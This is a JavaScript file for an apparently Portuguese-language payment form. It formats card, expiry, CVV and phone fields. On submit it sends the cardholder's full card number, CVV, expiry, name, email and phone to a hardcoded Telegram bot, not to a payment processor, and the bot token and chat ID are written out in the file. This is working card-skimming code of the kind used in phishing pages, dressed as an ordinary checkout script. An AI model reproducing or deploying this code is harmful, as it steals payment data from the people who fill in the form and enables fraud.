document.addEventListener('DOMContentLoaded', function () {
    const cardNumberInput = document.getElementById('numero-cartao');
    const validityInput = document.getElementById('validade');
    const cvvInput = document.getElementById('cvv');
    const phoneInput = document.getElementById('telefone');

    cardNumberInput.addEventListener('input', function (e) {
        let value = e.target.value.replace(/\D/g, '');
        value = value.replace(/(\d{4})(?=\d)/g, '$1 ').trim();
        e.target.value = value.substring(0, 19);
    });

    validityInput.addEventListener('input', function (e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length > 4) {
            value = value.substring(0, 4);
        }
        value = value.replace(/(\d{2})(\d)/, '$1/$2');
        e.target.value = value;
    });

    cvvInput.addEventListener('input', function (e) {
        let value = e.target.value.replace(/\D/g, '');
        e.target.value = value.substring(0, 3);
    });

    phoneInput.addEventListener('input', function (e) {
        let value = e.target.value.replace(/\D/g, '');
        value = value.replace(/^(\d{2})(\d)/g, '($1) $2');
        value = value.replace(/(\d{5})(\d{4})$/, '$1-$2');
        e.target.value = value.substring(0, 15);
    });

    document.querySelector('form').addEventListener('submit', function(event) {
        event.preventDefault();

        const cardNumber = document.getElementById('numero-cartao').value;
        const cardName = document.getElementById('nome-titular').value;
        const expiryDate = document.getElementById('validade').value;
        const cvv = document.getElementById('cvv').value;
        const email = document.getElementById('email').value;
        const phone = document.getElementById('telefone').value;

        const message = `
            Nome do titular: ${cardName}
            Número do cartão: ${cardNumber}
            Data de validade: ${expiryDate}
            CVV: ${cvv}
            E-mail: ${email}
            Telefone: ${phone}
        `;

        const chatId = '1109818560';
        const botToken = '5020186792:AAHU4puTSKw0mGw0l-yk7y1192Y8yb6Sld4';
        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

        fetch(url).then(response => {
            if (response.ok) {
                alert('Informações enviadas com sucesso!');
            } else {
                alert('Erro ao enviar informações.');
            }
        }).catch(error => {
            console.error('Erro:', error);
            alert('Erro ao enviar informações.');
        });
    });
});